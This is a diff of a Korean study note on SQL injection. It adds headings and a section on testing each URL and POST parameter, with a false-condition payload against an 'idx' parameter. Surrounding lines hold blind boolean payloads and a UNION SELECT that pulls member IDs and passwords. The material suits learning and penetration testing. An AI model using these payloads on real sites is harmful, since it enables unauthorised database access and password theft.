@@ -113,6 +113,7 @@ UNION SELECT 1,2,3,m_id,m_pwd,m_name,NULL,NULL FROM member--
 
 쿼리 결과가 **참/거짓**인지에 따라 정보를 획득하는 공격 기법.
 
+### 1.
 ```sql
 attacker' and 1=1--   -- 참 구문
 attacker' and 1=2--   -- 거짓 구문
@@ -133,7 +134,7 @@ attacker' and ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0))) AS VARCHAR(20)),6,
 
 ![](../Images/Pasted%20image%2020260730093626.png)
 
-
+### 2.
 ```sql
 다른 구문
 
@@ -143,9 +144,12 @@ attacker' and ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0))) AS VARCHAR(20)),6,
 ![](../Images/Pasted%20image%2020260730094602.png)
 
 
+### 3.
+모든 파라미터를 대상으로 파라미터 취약점을 찾아야함.
+Web URL 파라미터를 통해서 위 값을 공격해볼 수 있다.
+![](../Images/Pasted%20image%2020260730094926.png)
+- idx = 543에서 POST 값의 파라미터 변조로 사용할 수 있음
 
-
-
-
-
+- idx=543%' and 'a%'='b 이렇게 거짓 구문 삽입 시 아래와 같은 반응도 볼 수 있다.
+- ![](../Images/Pasted%20image%2020260730095337.png)
 
